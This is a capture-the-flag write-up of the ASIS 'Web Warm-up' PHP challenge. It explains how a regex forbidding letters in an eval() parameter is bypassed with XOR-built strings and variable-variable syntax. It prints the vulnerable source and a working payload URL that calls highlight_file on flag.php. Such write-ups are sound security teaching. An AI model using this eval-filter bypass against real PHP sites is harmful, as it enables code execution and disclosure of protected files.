# Web Warm-up
[![Generic badge](https://img.shields.io/badge/web-php-<COLOR>.svg)](https://shields.io/)

## Challenge

> Warm up! Can you break all the tasks? I'll pray for you!
>
> read flag.php
>
> Link: [Link](http://69.90.132.196:5003/?view-source)

## Analysis
When we click the link `http://69.90.132.196:5003/?view-source`, we can
see the source of the php file the runs the page:

```php
  <?php
if(isset($_GET['view-source'])){
     highlight_file(__FILE__);
     die();
}

if(isset($_GET['warmup'])){
     if(!preg_match('/[A-Za-z]/is',$_GET['warmup']) &&
strlen($_GET['warmup']) <= 60) {
     eval($_GET['warmup']);
     }else{
         die("Try harder!");
     }
}else{
     die("No param given");
}
```

The `view-source` URL parameter shows the content of the file through
the `highlight_file` PHP function.

The `warmup` URL parameter is first checked by `preg_match` with the
regex `/[A-Za-z]/is`, that is the URL parameter can't contain any
letter; second it check that the lenght is less than 60. Then, if all
the checks in the `ìf` clause are satisfied, the URL parameter is
evaluated by the `eval` PHP function.

If there wasn't the regex check, I could make this request:
`/?warmup=highlight_code('flag.php')`. In order to solve this challenge
I have to write this request without using letters in the URL parameter
`warmup`.

## XOR between strings

After a long search among
[PHP](https://www.php.net/manual/en/language.operators.bitwise.php),
[CTF
wiki](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#bypassing-the-upload-check)
pages I discovered that in PHP is possible to write a string as the XOR
of two strings. When the PHP interpreter finds `'A'^'?'`, it evaluates
the expression as `~`. I made a Z3 solver with python ([generate_Chars_as_xor.py](generate_Chars_as_xor.py)) to build more
complex strings as the XOR of 2 strings that don't contain ASCII letters.

You can check that the XOR produces the right string using a [PHP
sandbox](https://sandbox.onlinephpfunctions.com/).

## ...PHP headache

For the local tests I used the statement `echo 'hello';`, so that I could easily understand if it works.

My first attempt was to:
1. writing `echo 'hello';` as the XOR of two strings (the
`;` at the end is mandatory, as reported in the documentation of
[`eval`](https://www.php.net/manual/en/function.eval.php).
2. making a request with `warmup` parameter set with the XOR:
`http://69.90.132.196:5003/?warmup="@@30~|(@@[_[@"^"%#[_^[@%,70|{"`

However, it failed! The server returns `[500] Internal Server Error`.

Since I wanted to debug why it hadn't worked, I installed PHP in my
computer, created a `index.php` with the same source code of the
challenge, and started the server with the command `php -S
localhost:8000`. When the server receives my request it reports an
error: `PHP Parse error:  syntax error, unexpected end of file in
/home/index.php(3) : eval()'d code on line 1`.

Now I had to understand how to make `eval` working with the parameter
I'm sending via the URL. 

I made 2 tests:
1. In a PHP sandbox, I tried this PHP code: `<?php
eval("_<(0[|@>2__[@"^":_@_{[([^30|{");` (that stands for `<?php echo
'hello';`) and it works because it prints *hello*.

2. In my local PHP, I had a `index.php` with
```php
<?php
     if(isset($_GET['param'])){
         eval($_GET['param']);
         die();
     }
```
and I made the request
`http://localhost:8000/?param="_<(0[|@>2__[@"^":_@_{[([^30|{"`, that
doesn't work and reports the same error as before.

After a lot of tests I asked to
[StackOverflow](https://stackoverflow.com/questions/62746270/php-eval-of-a-xor-between-two-strings-via-the-url-parameter)
and I understood the problem:

 > [...] Now, on further inspection of the error, I found that eval()
requires statements and not expressions. [...]

In the first case, the interpreter first evaluates the XOR between the
strings and produces a new string: `"echo 'hello';"`. In this case `eval` receives
this string that contains a **statement**!

In the second case, `eval` receives `"_<(0[|@>2__[@"^":_@_{[([^30|{"`,
that is an **expression**. So `eval` doesn't receive a valid statement
and returns an error.

It is important to understand the difference between **statement** and
**expression**. There are a lot of questions and good answers in
Internet. As a rule of thumb, an expression is something that can be
assigned to a variable; what you can't assign to a variable is a statement.

**THANK YOU STACKOVERFLOW**

Long story short: my first idea isn't the solution because I'm passing
an expression and not a statement.

## Solution

I need to assign a statement to `warmup` parameter. Always in (CTF
wiki)[https://ctf-wiki.github.io/ctf-wiki/web/php/php/#bypassing-the-upload-check]
there is an explaination how to bypass the `preg_match` using more parameters.

If we forget for a moment of the check, the URL should be:

```
?warmup=$_GET['function']($_GET['filename'])&function=highlight_file&filename=flag.php
```

But in order to bypass the check, the URL becomes:

```
http://69.90.132.196:5003/?warmup=$_='{<8*'^'${}~';${$_}["_"](${$_}["__"]);&_=highlight_file&__=flag.php
```

1. `warmup=$_GET['function']($_GET['filename'])` becomes `warmup=$_='{<8*'^'${}~';${$_}["_"](${$_}["__"]);`:

    - `$_='{<8*'^'${}~';` is the first **statement** that creates a variable called `_` that contains a XOR between 2 strings. The result of the XOR is another string: `'_GET'`. I used my python generator to obtain the 2 strings to XOR. There are a lot of possible solutions. (Note the single quote; `$_="{<8*"^"${}~";` won't work).

    - `${$_}["_"](${$_}["__"]);` is the second statement:

         - `${$_}` is a [complex curly syntax](https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex) that encloses complex expressions. It stands for `$_GET`.

         - `["_"]` is the parameter that `_GET` is requesting. Recall the PHP notation to retrieve the parameters in a URL `$_GET["parameter"]`. In our case, the parameter is `_`.

         - `["__"]` is used to get the value of the parameter `__` in the URL request.

         - `()` are the parethesis needed to make a function call. PHP is a weak type language so if you write the pair of parenthesis after a variable name it will interpreted as a function.

2. `_=highlight_file` is the second parameter, called `_`, of the URL request.

3. `__=flag.php` is the third parameter, called `__`, of the URL request.

Recall that parameters are concatenated in a URL request by `&`.

The **imaginary** steps to reach the final URL request would be:
```
eval($_GET['warmup']);

   |
   |
   V

eval(  $_GET['_']( $_GET['__'] )  );

   |
   |
   V

eval(  highlight_code('flag.php')  );
```

The request:

```
http://69.90.132.196:5003/?warmup=$_='{<8*'^'${}~';${$_}["_"](${$_}["__"]);&_=highlight_file&__=flag.php
```

will produce

```php
<?php
$flag = "ASIS{w4rm_up_y0ur_br4in}";
?> 
```

## Flag

`ASIS{w4rm_up_y0ur_br4in}`


## References

1.
https://ctf-wiki.github.io/ctf-wiki/web/php/php/#bypassing-the-upload-check
2. https://rawsec.ml/en/meepwn-2018-write-up/#omegasector-web